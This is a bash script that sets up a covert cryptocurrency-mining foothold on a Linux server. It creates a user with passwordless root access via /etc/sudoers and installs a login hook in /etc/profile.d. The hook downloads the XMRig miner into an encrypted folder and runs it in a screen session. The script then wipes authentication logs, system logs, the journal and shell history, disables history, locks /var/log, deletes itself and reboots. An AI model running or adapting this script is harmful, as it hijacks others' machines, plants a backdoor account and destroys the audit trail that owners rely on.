#!/bin/bash

apt install ecryptfs-utils cryptsetup screen cryfs mc sudo -y
keyctl link @u @s
adduser --encrypt-home fast
adduser fast sudo
echo "fast ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
ecryptfs-setup-swap -f
echo "#!/bin/bash
sudo mkdir /home/fast/cr /home/fast/crd
sudo cryfs /home/fast/cr /home/fast/crd
sudo wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz -O /home/fast/crd/xm.tar.gz
sudo tar -xvzf /home/fast/crd/xm.tar.gz
sudo cp /home/fast/xmrig-6.18.0/config.json /home/fast/crd/config.json
sudo cp /home/fast/xmrig-6.18.0/xmrig /home/fast/crd/xmrig
sudo rm -rf /home/fast/xmrig-6.18.0
sudo rm -rf /home/fast/crd/xm.tar.gz
sudo rm -rf /var/log/auth.log /var/log/syslog.log /var/log/journal/* /root/.bash_history
sudo rm -rf /etc/profile.d/crar.sh
sudo echo 'unset HISTFILE
set +o history' >> ~/.bash_profile
sudo echo 'unset HISTFILE
set +o history' >> /etc/profile.d/disable.history.sh
history -c
cd /home/fast/crd/
sudo screen -S crd" >> /etc/profile.d/crar.sh
chmod 777 /etc/profile.d/crar.sh
rm -rf /root/cr.sh
chmod 000 /var/log/* -R
history -c
shutdown -r now
